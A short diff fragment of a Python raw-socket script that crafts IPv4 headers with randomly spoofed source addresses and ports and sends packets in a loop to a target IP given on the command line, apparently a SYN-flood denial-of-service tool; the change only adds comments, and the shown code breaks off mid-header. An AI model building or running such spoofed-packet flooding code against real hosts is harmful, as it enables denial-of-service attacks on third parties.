@@ -26,11 +26,11 @@ s.setsockopt(sc.IPPROTO_TCP, sc.IP_HDRINCL, 1)  # we make IPv4 header
 count = 0
 
 while count < 100:
-    srcIP = random.randint(0,2**32-1)
-    srcPort = random.randint(49152, 2**16-1)
-    target = sc.inet_aton(sys.argv[1])
+    srcIP = random.randint(0,2**32-1)   # spoof my IP
+    srcPort = random.randint(49152, 2**16-1)  # spoof my port   
+    target = sc.inet_aton(sys.argv[1])  # get target IP from command
     iphdr = b'\x45\x00\x00\x28gc\x00\x00'    # first 8 bytes of IPv
-    iphdr += b'\x80\x06\x00\x00'    #TTl + PROTOL + HDR_CKSUM
-    iphdr += struct.pack('>I4s', srcIP, target)
+    iphdr += b'\x80\x06\x00\x00'    # 3rd row, TTl + PROTOL + HDR_CKSUM
+    iphdr += struct.pack('>I4s', srcIP, target) # 4th and 5th row: IPv4 addrs
     # to make TCP hdr
     tcphdr = struct.pack('>HH')
